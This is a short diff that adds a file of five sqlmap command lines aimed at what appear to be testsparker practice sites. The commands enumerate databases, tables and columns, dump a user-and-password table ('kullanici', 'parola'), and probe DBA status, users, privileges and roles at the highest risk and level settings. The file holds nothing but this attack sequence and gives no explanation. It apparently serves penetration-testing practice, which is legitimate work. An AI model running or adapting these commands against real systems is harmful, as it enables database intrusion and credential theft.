@@ -1,0 +1,5 @@
+sqlmap -u “http://aspnet.testsparker.com/Products.aspx?pId=4” --dbs
+sqlmap -u “http://aspnet.testsparker.com/Products.aspx?pId=4” -D testsparker --tables
+sqlmap -u “http://aspnet.testsparker.com/Products.aspx?pId=4” -D testsparker -T tablo --columns
+sqlmap -u “http://aspnet.testsparker.com/Products.aspx?pId=4” -D testsparker -T tablo -C kullanici,parola --dump
+sqlmap -u http://php.testsparker.com/artist.php?id=2 --risk=3 --level=3 --dbms=mysql --is-dba --users --privileges --roles
